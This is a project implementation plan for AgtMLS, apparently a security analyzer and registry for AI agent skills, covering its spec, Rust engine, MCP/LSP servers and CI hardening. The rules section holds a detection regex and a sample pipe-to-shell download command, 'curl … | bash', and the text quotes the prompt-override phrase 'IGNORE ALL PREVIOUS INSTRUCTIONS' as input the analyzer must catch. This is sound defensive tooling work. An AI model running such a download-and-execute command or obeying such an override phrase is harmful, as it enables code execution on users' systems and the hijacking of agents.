<!-- SPDX-FileCopyrightText: 2026 Sebastien Rousseau -->
<!-- SPDX-License-Identifier: Apache-2.0 OR MIT -->

# AgtMLS Ecosystem — Implementation Plan

**Status:** phases 1 and 3 started. `agtmls-spec` and `agtmls-core` exist
locally and pass differential conformance; `agtmls-mcp`, `agtmls-lsp`,
`agtmls-wasm` and `agtmls-action` do not exist yet.
**Owner:** Sebastien Rousseau
**Rubric:** every repo is gated against [`SCORECARD.md`](SCORECARD.md).

---

## 0. Where we are

Phase 0 (stabilization) is largely complete in this repository. Each row was
reproduced before the fix and verified after.

**Correctness**

| Fix | Evidence |
|---|---|
| `doctor`, `status`, `evidence` crashed on every invocation | `CliDispatchTests`; seen failing against the pre-fix file, catching exactly those three |
| Gate never executed 24 of 34 subcommands | `test_every_declared_subcommand_is_covered` fails on any subcommand added without a dispatch case |
| `CASES` tuple could silently drop a test class | `loadTestsFromModule`; same 76 tests found by discovery |
| `uninstall` matched sibling checkouts by string prefix | `Path.is_relative_to` |

**Security**

| Fix | Evidence |
|---|---|
| `install` silently destroyed hand-written prompt files | `smoke-install-safety.py`, 6 properties; refuses by default, `--force` backs up byte-for-byte, `--dry-run` is inert |
| Unknown agent installed into a directory no runtime reads | Fails loudly with the supported list |
| Analyzer read only `*.md` | `auditable_files()`; audited surface 74 → 145 files |
| Split-line, variation-selector and soft-hyphen evasions | `evals/security/corpus.json`, 16 cases; 11 failed before the fix, 0 after |
| Analyzer failed open on missing/unparseable metadata | `AGT-POLICY-001/002/003`, HIGH |
| No capability-escalation check | `AGT-CAP-001`: frontmatter `allowed-tools` vs `safety_policy` |
| Findings had no machine-readable identity | Every finding carries `AGT-<CLASS>-<NNN>` |
| Importer fabricated a benign attestation | Audits first and refuses; preserves source metadata; `attested: false`, `risk_level: high`; symlink-safe copy |

**Compliance**

| Fix | Evidence |
|---|---|
| `SBOM.spdx.json` failed every SPDX validator | `pyspdxtools -i SBOM.spdx.json`: **0 errors**. `creationInfo`, `packages`, `relationships`, per-file `SPDXID` and the mandatory SHA1 all present |
| SBOM described 4 of 9 shipped paths | Now 338 files across all 17; `validate-sbom-conformance.py` diffs against `pyproject.toml` and caught two missing licence files while being written |
| No CycloneDX output | `SBOM.cyclonedx.json`, CycloneDX 1.6 |
| `provenance.json` hardcoded `1970-01-01T00:00:00Z` | Real in-toto Statement; timestamp is the commit date of the last change to a material — deterministic *and* true |

**Packaging and performance**

| Fix | Evidence |
|---|---|
| `make install` produced a binary that could run nothing | `smoke-make-install.py` runs the installed binary and asserts its version; uninstall leaves zero files |
| Gate ran every check twice | `checks.json` listed `agtmls-doctor.py`, and the doctor runs every check in `checks.json`. `--skip-gate` inside the gate: **180s → 0.87s** |
| Gate ran every check twice (see row above) | Removed |
| Analyzer walked every character of every file in Python | Compiled character class; line map built lazily, only once a pattern matches |

Gate: **62 checks**, all green, **~40s** (32s and 40s on two idle runs).

That is up from **21.3s** for the original 57 checks. The five added checks each
copy the registry or shell out to `make`, which is where the extra time goes;
removing the doctor's duplicate run of the entire gate paid most of it back.
The scorecard's 60s budget (criterion 3.3) is met, with little headroom —
§8.5 is still worth doing before more checks land.

An earlier figure of 137s in this document was wrong: it was measured while
Rust builds were running concurrently. Remaining hub work is in §8.

**Not applied — needs your review.** The CI changes remove or restructure
existing steps, which the assistant sandbox refused (correctly). They are
staged as a reviewable script: `./.git/agtmls-ci-hardening.sh --dry-run`.
It covers the six API keys reachable from `pull_request`, the matrix cost,
`concurrency`, commit-signature verification, the `inputs.tag` injection,
pinning `skills-ref`, SHA-pinning actions, and the missing PyPI Trusted
Publishing job.

---

## 0.1 Ecosystem status

All seven repositories exist and are public.

| Repository | Location | State |
|---|---|---|
| [`agtmls`](https://github.com/sebastienrousseau/agtmls) | `Public/Python/agtmls` | Phases 0 and 2 complete. 62-check gate, ~40s. Per-skill `integrity`; install verifies and writes a lockfile |
| [`agtmls-spec`](https://github.com/sebastienrousseau/agtmls-spec) | `Public/Other/agtmls-spec` | 8 documents (5 normative), 19 rules as data, 3 schemas, 44 corpus cases, a 4-level conformance runner |
| [`agtmls-core`](https://github.com/sebastienrousseau/agtmls-core) | `Public/Rust/agtmls-core` | **L4 verified.** Digest, rules, analyzers, lockfile. 0 clippy warnings under `pedantic` |
| [`agtmls-wasm`](https://github.com/sebastienrousseau/agtmls-wasm) | `Public/Rust/agtmls-wasm` | `@agtmls/wasm`. 410 KB gzipped against a 500 KB budget. Rules embedded at compile time |
| [`agtmls-action`](https://github.com/sebastienrousseau/agtmls-action) | `Public/JavaScript/agtmls-action` | SARIF to code scanning. Vendors the WASM module; no Rust toolchain at run time |
| [`agtmls-mcp`](https://github.com/sebastienrousseau/agtmls-mcp) | `Public/Rust/agtmls-mcp` | JSON-RPC over stdio, MCP `2025-06-18`. 5 tools, 2 resource families, 2 prompts |
| [`agtmls-lsp`](https://github.com/sebastienrousseau/agtmls-lsp) | `Public/Rust/agtmls-lsp` | Live diagnostics, frontmatter completion, capability-narrowing code actions |

### Publishing

Release workflows exist for crates.io (`agtmls-core`), npm (`agtmls-wasm`) and
PyPI (`agtmls`), all via Trusted Publishing, so no long-lived token exists to
leak. **Nothing is published yet**: each needs a one-time trusted publisher
registered on the registry and a matching GitHub environment, which cannot be
done from a checkout.

### What the second implementation proved

The point of building `agtmls-core` before the MCP and LSP servers was to find
out whether "one specification, two implementations" survives contact. It did,
and it immediately paid for itself: **31 of 31 registry skills digest
identically** under Python and Rust, both analyzers emit **identical rule sets**
on all 31 skills and all 16 corpus cases, and the differential pass found four
defects that neither implementation's own test suite could see.

| Defect | Found by | Consequence had it shipped |
|---|---|---|
| `AGT-EXEC-001` matched prose *warning against* `curl \| bash` | Rule self-test | The analyzer flags its own documentation, and teams suppress it wholesale |
| `re.IGNORECASE` was a compile flag and never reached the exported pattern | Rust conformance run | Rust matched case-sensitively; `IGNORE ALL PREVIOUS INSTRUCTIONS` passes |
| Backslashes escaped as for a TOML *basic* string | Rule self-test | Every pattern shipped as `\\s` and matched nothing at all |
| The Rust **binary** never called the structural rules its **library** implements | Analyzer differential | The shipped CLI silently weaker than the crate; every library test passed |

A fourth was found in the harness itself: the Rust conformance suite was
briefly placed where Cargo does not collect it and reported `ok. 0 passed`.
That is the failure `spec/07-conformance.md §7.3` now forbids — a suite must
fail, not skip, when its inputs are missing.

None of these were visible from inside the Python implementation. That is the
argument for the architecture, and it is now evidence rather than a claim.

---

## 1. Design thesis

Four surfaces will need to agree about what a skill *is*: the CLI, an LSP
server, an MCP server, and a browser. The ordinary way that ends is four
implementations of the same regex set, drifting quietly until a payload the
CLI blocks is one the LSP calls clean.

So the ecosystem is organised around one rule:

> **The specification is the product. Every implementation is a conformance
> target, and the corpus is what makes that claim checkable.**

This is the methodology already published in this repository as the
`cross-language-port` skill — differential golden-I/O testing across
languages. The ecosystem dogfoods it.

### Repository map

```
agtmls-spec          normative schemas + conformance corpus.   no code
   │                 versioned independently; everything else pins a range
   ├── agtmls        (this repo) registry data + Python CLI.  stdlib-only
   └── agtmls-core   Rust engine: parse · digest · audit · resolve
          ├── agtmls-mcp    MCP server (stdio + streamable HTTP)
          ├── agtmls-lsp    LSP server + VS Code / Zed / Neovim clients
          ├── agtmls-wasm   @agtmls/wasm + browser playground
          └── agtmls-action GitHub Action → SARIF → code scanning
```

Two implementations of the spec, deliberately:

- **Python (this repo)** stays dependency-free. `uvx agtmls` resolving
  instantly with nothing to audit is a real security property, not a slogan,
  and it is the reference implementation for registry *data*.
- **Rust (`agtmls-core`)** is the engine for everything interactive or
  embedded. An LSP that re-parses on every keystroke, and a WASM module that
  runs an audit in a browser tab, are not things to build on subprocess calls
  to Python.

They are kept honest by `agtmls-spec`'s corpus, replayed against both in CI.
If they disagree, both builds fail.

### Why Rust for the engine

1. One engine serves CLI, LSP, MCP and WASM. The alternative is four rule sets.
2. WASM is a first-class target; the browser playground is not achievable otherwise.
3. The entire product parses hostile input. `#![forbid(unsafe_code)]` plus a
   fuzzed parser is a defensible claim; a hand-rolled Python regex pass is not.
4. Cold start. An LSP must answer in single-digit milliseconds.

### Why not to fold these into one repo

Release cadence differs by an order of magnitude. The registry's *content*
changes weekly; the *spec* should change quarterly and loudly. A monorepo
couples them and makes every skill edit look like a spec change.

---

## 2. `agtmls-spec` — the keystone

**Build first. Nothing else is meaningful until this exists.**

```
agtmls-spec/
├── spec/
│   ├── 00-overview.md
│   ├── 01-skill.md            SKILL.md: frontmatter, body budget, progressive disclosure
│   ├── 02-metadata.md         metadata.json: safety_policy, bundle, maturity
│   ├── 03-integrity.md        the digest algorithm, normative
│   ├── 04-rules.md            analyzer rule IDs, severities, categories
│   ├── 05-index.md            index.json registry format
│   ├── 06-lockfile.md         .agtmls/manifest.json
│   └── 07-conformance.md      how an implementation claims conformance
├── schema/
│   ├── skill-frontmatter.schema.json
│   ├── metadata.schema.json
│   ├── index.schema.json
│   ├── lockfile.schema.json
│   └── finding.schema.json
├── corpus/
│   ├── security/corpus.json   ← moves here from agtmls/evals/security/
│   ├── digest/cases.json      skill trees with expected digests
│   ├── frontmatter/cases.json parse inputs with expected ASTs
│   └── index/cases.json
└── conformance/
    └── runner.md              the contract a runner must satisfy
```

### 2.1 The integrity digest (normative)

The keystone algorithm. Everything downstream — install verification,
per-skill versioning, rug-pull detection, lockfiles — depends on it being
stable across a clone, a `--copy` install, a wheel extraction and a tarball.

```
skill_digest(dir) =
  SHA256( for each file f in dir, sorted by POSIX relative path:
            utf8(relpath(f)) || 0x00 ||
            SHA256(contents(f)) || 0x00 )
```

Normative rules:

- Sort by the **byte sequence** of the POSIX relative path, not locale order.
- Exclude: `__pycache__/`, `.git/`, `.DS_Store`, `*.pyc`, `.agtmls/`.
- Symlinks are **excluded and reported**, never followed. A skill that
  depends on a symlink is not portable and must not be silently digestible.
- Mode bits are **not** hashed; the executable bit does not survive every
  transport. It is recorded separately in the lockfile.
- Empty directories are not represented. A directory is its files.
- Output: `sha256:<64 lowercase hex>`.

Test vectors live in `corpus/digest/cases.json` and must pass identically in
Python and Rust. Failing that is a release blocker for both.

### 2.2 Rule identifiers

Already started in this repo: `AGT-<CLASS>-<NNN>`.

| Prefix | Class | Default severity |
|---|---|---|
| `AGT-STEG` | Hidden/invisible code points | CRITICAL |
| `AGT-INJ` | Prompt injection, jailbreak | HIGH |
| `AGT-EXEC` | Unsafe execution, credential access | HIGH |
| `AGT-EXFIL` | Data exfiltration channels | HIGH |
| `AGT-CAP` | Capability escalation vs declared policy | HIGH |
| `AGT-POLICY` | Policy honesty and attestation | HIGH / MEDIUM |
| `AGT-SCAN` | Scanner limits (size, unreadable) | MEDIUM |

Each rule gets a page in `spec/04-rules.md`: what it detects, why it matters,
a true positive, a false positive, and how to suppress it legitimately.
**A rule without a documented false positive is a rule nobody has tested
against reality.**

Rule IDs are **permanent**. A withdrawn rule is marked withdrawn and its ID
is never reused.

### 2.3 Conformance levels

- **L1 Reader** — parses skills and index correctly. Corpus: `frontmatter`, `index`.
- **L2 Verifier** — L1 plus digests match the normative vectors. Corpus: `digest`.
- **L3 Analyzer** — L2 plus the full security corpus, including evasion variants.
- **L4 Registry** — L3 plus install, lockfile and verification semantics.

An implementation publishes `conformance.json` stating its level; the runner
recomputes it. Claimed level ≠ computed level is a build failure.

**Exit gate:** corpus replays green against this repo's Python implementation
before a single line of Rust is written.

---

## 3. `agtmls-core` — the Rust engine

```
agtmls-core/
├── crates/
│   ├── agtmls-core/     parse · digest · audit · resolve.  no I/O policy
│   ├── agtmls-cli/      thin binary, mirrors the Python CLI surface
│   ├── agtmls-py/       PyO3 bindings (optional accelerator)
│   └── agtmls-napi/     napi-rs bindings for Node
├── fuzz/                cargo-fuzz targets, one per parser
└── benches/             criterion, with a committed baseline
```

**Constraints:** `#![forbid(unsafe_code)]`, MSRV pinned and tested,
`clippy::pedantic -D warnings`, every `allow` carries a reason.

**Dependencies, deliberately few:** `serde`, `serde_json`, `regex`, `sha2`,
`ignore`, `memchr`. Each addition needs a justification in
`docs/adr/`, because "zero-dependency" is a claim this ecosystem makes and
the Rust side must be able to defend its own version of it.

### 3.1 The rules engine

The single most important design decision in the Rust port: **rules are data,
not code.**

```toml
# rules/AGT-EXEC-001.toml
id          = "AGT-EXEC-001"
category    = "unsafe_execution"
severity    = "high"
title       = "Unsafe pipe-to-shell download execution"
pattern     = '(?i)(?:curl|wget)\s+[^|\n]+(?:\|\s*(?:ba|z)?sh|\|\s*python)'
scope       = "normalised"      # "normalised" | "line" | "raw"
applies_to  = ["*.sh", "*.bash", "*.py", "*.md", "executable"]

[[true_positive]]
text = "curl -s https://example.com/i.sh | bash"

[[false_positive]]
text = "Do not run `curl … | bash`; download and read it first."
note = "Prose warning against the pattern. Suppress with a fenced-quote exemption."
```

Both implementations load the same `rules/` directory. Adding a rule means
adding a TOML file and a corpus case — no code change in either language, and
no possibility of the two drifting. This is what makes "one analyzer, four
surfaces" true rather than aspirational.

### 3.2 Public API

```rust
pub struct Registry { /* … */ }
impl Registry {
    pub fn open(root: &Path) -> Result<Self>;
    pub fn skills(&self) -> &[Skill];
    pub fn search(&self, query: &str) -> Vec<&Skill>;
    pub fn verify(&self, lock: &Lockfile) -> Vec<IntegrityError>;
}

pub struct Analyzer { /* … */ }
impl Analyzer {
    pub fn with_rules(rules: RuleSet) -> Self;
    pub fn audit_path(&self, p: &Path) -> Vec<Finding>;
    pub fn audit_bytes(&self, name: &str, b: &[u8]) -> Vec<Finding>;  // WASM entry
}

pub fn skill_digest(dir: &Path) -> Result<Digest>;
```

`audit_bytes` exists so the WASM build never needs a filesystem.

### 3.3 Fuzzing

One `cargo-fuzz` target per parser: frontmatter, metadata JSON, index, rule
TOML. Seeded from the conformance corpus. Nightly run, 24h budget, crashes
auto-filed. Criterion 1.5 and 2.8 on the scorecard depend on this.

### 3.4 Differential CI

The job that justifies the whole architecture:

```yaml
- name: Differential conformance
  run: |
    python3 agtmls/scripts/audit-skill.py --format json corpus/ > py.json
    cargo run -p agtmls-cli -- audit --format json corpus/     > rs.json
    python3 conformance/diff.py py.json rs.json   # rule id, severity, file, line
```

Any divergence fails both repos. This is the mechanism that keeps two
implementations from becoming two products.

---

## 4. `agtmls-mcp` — the distribution surface

**The highest-leverage feature in the plan.** By 2027, "an agent discovers a
capability" means "an agent queries an MCP server", not "a shell script made
some symlinks". A registry that is only a file-copier is architecturally
cornered.

### 4.1 Surface

**Resources**

| URI | Content |
|---|---|
| `agtmls://skill/{name}` | `SKILL.md`, progressive disclosure preserved |
| `agtmls://skill/{name}/{ref}` | `reference.md` and other assets |
| `agtmls://index` | full registry index |
| `agtmls://catalog` | human-readable catalog |

**Tools**

| Tool | Purpose |
|---|---|
| `agtmls_search(query, bundle?, risk_max?)` | rank skills; returns name, description, digest, risk |
| `agtmls_show(name)` | full record including `integrity` |
| `agtmls_audit(content \| path)` | findings with rule IDs |
| `agtmls_install(name, target, verify=true)` | install, digest-verified |
| `agtmls_verify(target)` | check an installed tree against its lockfile |

**Prompts:** `review-skill`, `harden-skill`, `port-skill`.

### 4.2 Transports and trust

- **stdio** — local, offline, no telemetry. The default and the free tier.
- **streamable HTTP** — hosted. OAuth resource server, org-scoped private
  skills, audit logs, metering.

The surface is identical across both, which is why the open tier can be a
real product rather than a crippled demo. **The stdio server must work with
the network disabled and must emit no telemetry**, verified by an
offline test in CI (scorecard 6.10). A local-first keyless tool that phones
home has traded its only durable asset.

### 4.3 Conformance

MCP Inspector in CI, plus a recorded JSON-RPC transcript test so protocol
regressions are caught without the Inspector being available.

---

## 5. `agtmls-lsp` — the authoring surface

Writing a skill today has no editor support whatsoever. You write YAML
frontmatter by hand, guess at `allowed-tools`, and find out at CI time. This
is the cheapest large DX win available, and nobody in the space has it.

### 5.1 Capabilities

| LSP method | Behaviour |
|---|---|
| `textDocument/publishDiagnostics` | every analyzer rule, live, with rule ID and severity |
| `textDocument/completion` | frontmatter keys; `allowed-tools` values; bundle names from the index |
| `textDocument/hover` | rule documentation on a diagnostic; skill metadata on a name |
| `textDocument/codeAction` | see below |
| `textDocument/definition` | `reference.md` links, bundle siblings |
| `textDocument/documentSymbol` | SKILL.md section outline |
| `workspace/symbol` | every skill in the registry |
| `textDocument/formatting` | canonical frontmatter order — the same transform as `sync-skill-frontmatter.py` |

### 5.2 Code actions — the part that earns its keep

- **Remove invisible character** — one keystroke on an `AGT-STEG-001`.
- **Narrow `allowed-tools` to match `safety_policy`** — resolves `AGT-CAP-001`
  in the safe direction, never the permissive one.
- **Widen `safety_policy` to match `allowed-tools`** — offered second, with an
  explicit warning, because it grants capability.
- **Generate missing `metadata.json`** — from the template, review-gated.
- **Quarantine this skill** — set `maturity: draft`, `risk_level: high`.
- **Extract to `reference.md`** — when the body exceeds its budget.

### 5.3 Clients

- **VS Code** — `agtmls.vscode`, bundles the server binary per platform.
- **Zed** — extension, `context_server` + LSP.
- **Neovim** — `nvim-lspconfig` upstream PR; the config is ~15 lines.
- **Helix** — `languages.toml` snippet in the README.

Server is a single static binary; clients are thin. Do not reimplement rules
in any client.

### 5.4 Performance budget

Cold start < 100ms. Diagnostics on a 500-line `SKILL.md` < 10ms.
Incremental sync, debounced 150ms. Enforced by criterion benchmarks
(scorecard 3.10).

---

## 6. `agtmls-wasm` — reach and trust

`agtmls-core` compiled with `wasm-bindgen`, published as `@agtmls/wasm`.

Three things it unlocks:

1. **A browser playground.** Paste a skill, get findings, *with nothing
   leaving the page*. For a security tool this is not a demo — it is the
   trust argument. "We cannot see your skill because it never reaches us"
   is a much stronger claim than a privacy policy.
2. **VS Code Web / github.dev.** The LSP client works without a native binary.
3. **CI without a toolchain.** `agtmls-action` runs the WASM build under Node,
   so the Action has no platform matrix and no Rust install step.

Size budget: **< 500 KB** gzipped, enforced in CI. `wasm-opt -Oz`,
`panic=abort`, no `std::fmt` in the hot path.

API surface deliberately tiny:

```ts
import init, { audit, digest, parseSkill } from "@agtmls/wasm";
await init();
const findings = audit("SKILL.md", content);   // Finding[]
```

---

## 7. `agtmls-action` — the adoption engine

```yaml
- uses: sebastienrousseau/agtmls-action@v1
  with:
    path: .claude/skills
    fail-on: high        # critical | high | medium | low | never
    format: sarif
- uses: github/codeql-action/upload-sarif@<sha>
  with: { sarif_file: agtmls.sarif }
```

Findings appear as inline PR annotations via GitHub code scanning. This is the
top-of-funnel: a team adopts the Action to check their own skills, and the
registry follows. Ship the malicious-fixture corpus publicly alongside it as
the reference benchmark for skill-security tooling — being the group that
defines the benchmark is worth more than being the group with the most rules.

Implementation: composite action over `@agtmls/wasm` under Node 20. No
platform matrix, no compilation, sub-second cold start.

---

## 8. Remaining work in this repository

Ordered by leverage. Everything here is from the audit and is **not yet done**.

### 8.1 Content-addressed skills — prerequisite for the ecosystem

The version string lives in **81 files**; `bump-version.py` rewrites it
wholesale, so every release is a 129-file diff and `version` on a skill that
has not changed in five releases still reads as current. It carries no
information. Replace with:

1. `skill_digest()` per §2.1, in `scripts/_lib/digest.py`.
2. `"integrity": "sha256:…"` on every `index.json` skill record.
3. `bump-version.py` bumps a skill's version **only when its digest moved**.
4. Per-skill changelog generated from digest transitions.
5. The SBOM's package checksum becomes the same digest — index, SBOM and
   installer finally reference one number.

### 8.2 Install-time verification

```
agtmls install rust claude --verify      # default once 8.1 lands
  → recompute each source skill's digest
  → compare with index.json
  → refuse on mismatch (exit 3, INTEGRITY_FAILURE)
  → write .agtmls/manifest.json (name, digest, mode, timestamp)
```

Unlocks `agtmls status --verify` (local drift), `agtmls upgrade` (digest-diff
only what changed), and honest rug-pull detection. **This is what separates
AgtMLS from a fancy `ln -s`.**

### 8.3 CI hardening

- Delete the `Smoke Live Providers` step from `validate.yml`. It injects six
  LLM API keys into a 10-leg matrix on `pull_request`; same-repo branches
  receive secrets. `live-provider-smoke.yml` already covers it on a schedule.
- SHA-pin every action. The README carries an OpenSSF Scorecard badge and the
  config loses points on the metric it advertises.
- Pin `skills-ref`, or vendor it. It is installed unpinned in the **release**
  workflow, which has `contents: write` and `id-token: write`.
- `env:`-indirect `${{ inputs.tag }}` in `release.yml`.
- PR matrix → 3.10 + 3.14; full 5×2 on `main` and tags.
- Add `concurrency: cancel-in-progress`.
- Verify commit signatures against `KEYS.asc` — the README says signing is
  *required*; nothing enforces it.

### 8.4 Publish where users install

`release.yml` builds and attests a wheel, then uploads it to GitHub Releases
only. The README says `pip install agtmls`. PyPI is therefore populated by
hand, outside the attested pipeline — the provenance chain covers an artifact
almost nobody installs. Add PyPI Trusted Publishing (OIDC, PEP 740).

### 8.5 Gate ergonomics and speed

- `run-all-checks.py` reads `checks.json` instead of duplicating it.
- Collect **all** failures rather than returning on the first: today one fix
  per CI round-trip.
- Process pool over independent checks. The gate is ~40s against a 21.3s
  baseline and a 60s budget — met, but with little headroom. The cost is
  concentrated in checks that copy the whole registry or shell out to `make`:
  `smoke-export.py`, `smoke-release-pack.py`, `smoke-install-safety.py`,
  `smoke-install-verify.py`, `smoke-make-install.py`. They are independent of
  each other and parallelise cleanly; a content-digest cache removes the rest.

### 8.6 Structured output

Promote `agtmls-doctor.py`'s `Reporter` into `scripts/_lib/report.py`;
`--log-format=json` everywhere; a documented exit-code taxonomy; SARIF from
`audit`.

### 8.7 Smaller items

- Rewrite the remaining semicolon-compressed scripts. `generate-sbom.py` and
  `generate-provenance.py` are done; `generate-agent-card.py`, `bench.py`,
  `record-evidence.py`, `evolve-session.py`, `validate-governance.py`,
  `generate-docs-site.py`, `generate-completions.py`,
  `generate-plugin-manifests.py`, `validate-packaging.py` and
  `validate-skills.py` remain.
- `ruff`, `shellcheck` and `agtmls check` into `.pre-commit-config.yaml`.
- `validate-secrets.py`: widen beyond 8 suffixes; scan history; add entropy
  and vendor-token patterns.
- `bench.py` must measure time or be renamed.
- `agent-card.json` is not an A2A card — `capabilities` is an array where the
  spec defines an object, and `protocolVersion`, `url`, `preferredTransport`,
  `defaultInputModes`/`defaultOutputModes` and `provider` are absent.

---

## 9. Sequencing

Dependencies are real; this order is not negotiable without breaking something.

| Phase | Work | Weeks | Exit gate |
|---|---|---|---|
| **0** | Stabilization | — | **mostly done**; §8.3–8.5 remain |
| **1** | `agtmls-spec` + digest + corpus migration | 2–3 | **Done** — corpus replays green against Python |
| **2** | §8.1 + §8.2 in the hub | 2 | **Done** — install refuses a tampered registry (exit 3) and records a lockfile; `verify` detects modification, deletion and drift |
| **3** | `agtmls-core` + differential CI | 4–6 | **Done** — L4 verified: digests, rule sets and lockfile verification all identical across both implementations |
| **4** | `agtmls-wasm` + `agtmls-action` | 2 | **Done** — 410 KB gzipped; SARIF wired to code scanning |
| **5** | `agtmls-mcp` | 3–4 | **Done** — 5 tools over stdio; path traversal refused; tool failures are content, not protocol errors |
| **6** | `agtmls-lsp` + VS Code client | 4–6 | **Server done**; the VS Code extension is not written |
| **7** | Scorecard tool; all repos ≥ 9.5 | 2 | `--fail-under` wired into every repo |

**~6 months part-time.** Phases 4–6 can overlap once phase 3 lands.

### Hard gates

- **Do not start phase 3 before phase 1 exits.** A Rust rewrite without a
  normative spec produces two implementations and no arbiter.
- **Do not start phase 5 or 6 before phase 3 exits.** Building MCP and LSP on
  an unverified analyzer ships the current defects to a much larger blast
  radius.
- **Do not create a repo before its scorecard baseline is green.** Bootstrap
  each new repo from the same template with CI, `SECURITY.md`, signing and
  the scorecard already wired. Retrofitting governance is how repos end up at
  7/10 permanently.

---

## 10. Commercial shape

Filtered through the five pillars.

**Open core, with the seam at the transport, not the features.**

| Tier | Contents |
|---|---|
| **Open** (Apache-2.0 OR MIT) | spec, core, CLI, LSP, WASM, Action, stdio MCP, the public registry |
| **Team** | hosted MCP over HTTP: private org skills, SSO, audit logs, policy packs, org scorecard dashboard |
| **Enterprise** | on-prem registry, custom rule packs, SLA, compliance exports (SBOM/SARIF/attestation bundles) |

The free tier is a complete, useful product — the same surface, running
locally. That is the only version of open core that does not poison community
trust, and it matters more here than usual because the product is a security
tool.

**The wedge is the analyzer, not the registry.** Skills are commoditizing;
static analysis of them is not. `agtmls-action` drives adoption, the
benchmark corpus makes the project the reference, and the dashboard and
policy packs are what teams pay for.

### Advised against (pillar 4)

- A web UI or docs-site rebuild. `generate-docs-site.py` suffices.
- Growing past 31 skills before phase 2 lands. More skills multiply an
  unverified surface; depth beats breadth here.
- Rewriting `setup-workspace.sh` in Python. It is well-commented, it works,
  and it now has safety guards and a test.
- Adding runtimes. Each one is a permanent tax on a manifest generator. The
  MCP server makes runtime count largely irrelevant — build the transport,
  not more adapters.
- A hosted registry before phase 5. Without §8.2 there is nothing to host
  that a tarball does not already do.

### Never

Telemetry in the local tier. Gating integrity verification behind a paid
plan. Either one converts the project's single durable asset — being
trustworthy about supply chain — into a liability.
